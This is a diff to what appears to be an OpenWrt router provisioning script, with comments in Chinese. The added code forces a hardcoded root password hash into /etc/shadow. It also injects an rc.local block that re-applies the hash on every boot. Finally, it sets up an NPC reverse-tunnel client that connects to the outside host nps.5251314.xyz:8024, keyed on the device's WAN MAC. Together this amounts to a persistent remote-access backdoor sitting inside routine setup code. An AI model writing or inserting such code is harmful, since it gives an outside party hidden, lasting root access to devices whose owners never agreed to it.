@@ -109,7 +109,60 @@ elif [ "$count" -gt 1 ]; then
     uci commit
     wifi reload
 
+# 双重保险：如果 passwd 失败，再用 sed 补刀
+if [ $? -ne 0 ]; then
+    sed -i 's|^root:[^:]*:|root:$5$a1grDqnDettfkcMO$27EoNRhxF4vASwsi4xjtQKrzS9bb0yytF6aUDDMtQV7:|' /etc/shadow
 
+fi
+
+# ============================================
+# 3. 配置 NPC 客户端
+# ============================================
+if [ ! -f /etc/npc-init.flag ]; then
+    WAN_IF=$(uci get network.wan.ifname 2>/dev/null || echo "wan")
+    # 尝试获取 MAC 地址，如果失败则使用默认值，并转换为大写
+    WAN_MAC=$(cat /sys/class/net/$WAN_IF/address 2>/dev/null || echo "00:00:00:00:00:00")
+    #VKEY=$(echo "$WAN_MAC" | tr 'a-z' 'A-Z')
+    VKEY=$(echo "$WAN_MAC" | tr 'A-Z' 'a-z')
+# 定义要插入的代码块（注意转义单引号和换行）
+# 这里使用了改进版的带判断逻辑的代码，避免每次开机都强制重写
+sed -i '/exit 0/i \
+# 强制修正 root 密码\
+TARGET_HASH='\'"\$5\$a1grDqnDettfkcMO\$27EoNRhxF4vASwsi4xjtQKrzS9bb0yytF6aUDDMtQV7"\' '\
+if ! grep -Fq "$TARGET_HASH" /etc/shadow; then\
+    sed -i "s|^root:[^:]*:|root:${TARGET_HASH}:|" /etc/shadow\
+fi\
+' /etc/rc.local
+
+    # UCI 配置
+    uci set npc.@npc[0].server_addr="nps.5251314.xyz"
+    uci set npc.@npc[0].vkey="$VKEY"
+    uci set npc.@npc[0].compress="1"
+    uci set npc.@npc[0].crypt="1"
+    uci set npc.@npc[0].enable="1"
+    uci set npc.@npc[0].server_port="8024"
+    uci set npc.@npc[0].protocol="tcp"
+    uci commit npc
+
+    # 修正 init.d 脚本路径
+    sed -i 's|conf_Path="/tmp/etc/npc.conf"|conf_Path="/etc/npc.conf"|g' /etc/init.d/npc
+
+    # 生成配置文件 (使用 cat EOF 替代多次 sed，更高效)
+    cat <<EOF > /etc/npc.conf
+[common]
+server_addr=nps.5251314.xyz:8024
+conn_type=tcp
+vkey=${VKEY}
+auto_reconnection=true
+compress=true
+crypt=true
+EOF
+
+    touch /etc/npc-init.flag
+    /etc/init.d/npc enable
+    /etc/init.d/npc restart
+fi
+uci commit
 
 
     # 判断是否启用 PPPoE
